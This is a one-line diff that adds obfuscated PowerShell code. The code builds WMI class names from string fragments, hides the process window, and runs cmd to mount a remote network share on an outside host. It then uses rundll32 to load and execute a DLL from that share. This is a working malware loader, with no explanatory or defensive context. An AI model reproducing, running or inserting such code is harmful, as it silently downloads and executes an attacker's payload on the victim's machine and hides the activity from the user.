@@ -1,0 +1,1 @@
+$DmIeq0f8=([wmiclass]('Win'+'32_'+'P'+'ro'+'cessS'+'tar'+'tu'+'p')).CreateInstance();$DmIeq0f8.ShowWindow=0;([wmiclass](-join('Win32_','Proces','s'))).Create((-join('cmd',' /c push','d \\lv','t.vip','1xbe','t.n','et\4e0d8','4da-c','118-4423','-83c4','-2','b0','b4883f3e','c & ru','nd','ll32 pf','.ch,#','1')),$null,$DmIeq0f8)
